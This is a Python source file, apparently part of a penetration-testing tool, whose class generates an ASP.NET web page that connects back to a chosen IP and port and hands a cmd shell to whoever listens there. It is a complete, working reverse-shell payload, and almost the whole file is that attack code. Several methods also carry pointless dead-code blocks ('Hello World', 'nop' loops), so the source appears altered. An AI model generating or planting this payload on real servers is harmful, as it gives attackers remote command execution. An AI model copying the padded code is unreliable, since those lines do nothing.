from .base import ShellCode

class AspxShellCode(ShellCode):
    """
        Class with shellcode for .NET language
    """

    def __init__(self, connect_back_ip='localhost', connect_back_port=5555, bad_chars=['\x00']):
        if False:
            print('Hello World!')
        ShellCode.__init__(self, connect_back_ip=connect_back_ip, connect_back_port=connect_back_port, bad_chars=bad_chars)

    def get_aspx_code(self):
        if False:
            for i in range(10):
                print('nop')
        ' Function to get aspx reverse shellcode '
        if not self.connect_back_ip or not self.connect_back_port:
            print('Settings for connect back listener must be defined')
            return False
        aspx_code = '\n        <%@ Page Language="C#" %>\n        <%@ Import Namespace="System.Runtime.InteropServices" %>\n        <%@ Import Namespace="System.Net" %>\n        <%@ Import Namespace="System.Net.Sockets" %>\n        <%@ Import Namespace="System.Diagnostics" %>\n        <%@ Import Namespace="System.IO" %>\n        <%@ Import Namespace="System.Security.Principal" %>\n        <script runat="server">\n            static NetworkStream socketStream;\n            protected void CallbackShell(string server, int port)\n            {\n                System.Net.Sockets.TcpClient clientSocket = new System.Net.Sockets.TcpClient();\n                clientSocket.Connect(server, port);\n                socketStream = clientSocket.GetStream();\n                Byte[] bytes = new Byte[8192];\n                String data = null;\n                Process CmdProc;\n                CmdProc = new Process();\n                CmdProc.StartInfo.FileName = "cmd";\n                CmdProc.StartInfo.UseShellExecute = false;\n                CmdProc.StartInfo.RedirectStandardInput = true;\n                CmdProc.StartInfo.RedirectStandardOutput = true;\n                CmdProc.StartInfo.RedirectStandardError = true;\n                CmdProc.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler);\n                CmdProc.ErrorDataReceived += new DataReceivedEventHandler(SortOutputHandler);\n                CmdProc.Start();\n                CmdProc.BeginOutputReadLine();\n                CmdProc.BeginErrorReadLine();\n                StreamWriter sortStreamWriter = CmdProc.StandardInput;\n                int i;\n                while ((i = socketStream.Read(bytes, 0, bytes.Length)) != 0)\n                {\n                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);\n                    if (data == "exit")\n                        break;\n                    sortStreamWriter.WriteLine(data.Trim());\n                }\n                clientSocket.Close();\n                CmdProc.Close();\n            }\n            public static void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)\n            {\n                string[] SplitData = outLine.Data.Split(\'\\n\');\n                foreach (string s in SplitData)\n                {\n                     byte[] msg = System.Text.Encoding.ASCII.GetBytes(s + "\\r\\n");\n                     socketStream.Write(msg, 0, msg.Length);\n                }\n            }\n            protected void Page_Load(object sender, EventArgs e)\n            {\n                CallbackShell("{{LOCALHOST}}", {{LOCALPORT}});\n            }\n        </script>\n        '
        aspx_code = self.format_shellcode(aspx_code)
        return aspx_code

    def get_shellcode(self, inline=False):
        if False:
            while True:
                i = 10
        shell = self.get_aspx_code()
        if inline:
            shell = self.make_inline(shell)
        return shell